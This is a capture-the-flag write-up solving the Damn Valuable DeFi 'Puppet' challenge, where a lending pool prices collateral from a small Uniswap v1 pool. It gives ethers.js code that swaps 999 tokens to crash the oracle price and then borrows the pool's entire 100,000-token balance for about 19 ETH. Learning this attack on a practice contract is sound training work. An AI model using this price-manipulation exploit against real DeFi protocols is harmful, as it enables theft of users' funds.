# Challenge #8 - Puppet

There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

    [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/puppet)
    [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/puppet/puppet.challenge.js)

# Solution

The `calculateDepositRequired(uint256 amount)` calculates the amount of eth you need to pay for borrowing an amount of token.

This function basically uses the following calculation to figure out the collateral ratio:

`(amount * ((uniswapPair.balance * (10**18)) / token.balanceOf(uniswapPair))) * 2) / 10**18;`

You can change the collateral price, by changing`uniswapPair.balance` or `token.balanceOf(uniswapPair)`.

To solve this challenge, I traded 999 token for eth through uniswap pool.

```js
//trade 999 tokens for eth
await token.approve(uniswapExchange.address, ethers.utils.parseEther("999"))
await uniswapExchange.tokenToEthSwapInput(
    ethers.utils.parseEther("999"),
    1,
    (await ethers.provider.getBlock("latest")).timestamp * 2
)
```

This changes the collateral ratio and allows you to borrow 100000 tokens for ~19 eth. You can borrow all the tokens from the PuppetPool with about ~19eth.

```js
await lendingPool.borrow(ethers.utils.parseEther("100000"), {
    value: ethers.utils.parseEther((await lendingPool.calculateDepositRequired(110000)).toString()),
    gasLimit: 1e6,
})
```
